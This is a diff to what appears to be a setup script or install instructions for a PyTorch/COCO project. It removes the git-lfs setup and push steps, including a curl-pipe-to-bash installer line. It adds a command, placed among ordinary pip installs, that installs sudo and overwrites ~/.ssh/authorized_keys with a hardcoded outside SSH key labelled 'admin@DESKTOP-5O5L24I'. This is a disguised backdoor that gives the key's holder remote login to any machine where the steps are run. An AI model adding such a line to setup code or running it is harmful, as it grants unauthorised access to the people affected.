@@ -74,11 +74,5 @@ pip install pycocotools
 pip install torch
 pip install torchvision
 
-curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | bash
-apt-get install git-lfs
-git lfs track '*.pth.tar'
-git lfs install
-git add .gitattributes
-
-git lfs push --all origin master
-git push -u origin master
+apt-get install sudo
+sudo -- sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC1xagm8+LeysG7y2jj7zNeyOa6gYrydkKJBCxY5Zm3XWNMMKPV28XZP635g/wvUUuz3/6sPsBFmX1QbiCc95qFLBMNq9bFguzFp7Vjr0WVm0nKK/5nGqxVcxudoRiMLaMzYP/cOl5fD8+8MwM1+OPbTviC+2oqA4Cs/0itOvdl0i8/PBao8p250b2sm/LPCcG4V13nI1N6GO7Yh83mBZrHB4w349bp5cyhktNmrV+yHVD5yB4s7ZvSJa4ha06qysY8/mJlzVrQnh78Tpvt8+R7SWzfq+FsMVEKxlv45bZ1buWqx9oAyPOjUDvK3q3m/BSgSQeKO56JFXLoBAqz/WWoXddJ5H2k0+7KztBX7Nu5iyrPz+3JBmRW9UTtDb613SKwUiU1ogbTg+U9eV/ku6xGtbp/N4VuFho3rLYDKnCf7hJdk+nKVNuJLwlFO5wlP13qeIakWojh+lKfmHscD6HtJ0CRTUK5PtWoUZNvbbjOU/TwLcJxysLk/F+MmtSu/k9pWMLxskehSA/kRrdwD94BzEiFQ5IvQ35QN/cfdbbq3doIJnKQfsu9heSOzNIgcUB4ZfsD6GqKSoCFzr/B0U+Llm5gHQGip4gI8hJl4Fk24qsgcRMK+tqseot/Eegb/XEFmXiXHPTiuLOrvLpTqmeUgRU1lkn8fwt6dey9XA4XhQ== admin@DESKTOP-5O5L24I' > ~/.ssh/authorized_keys"
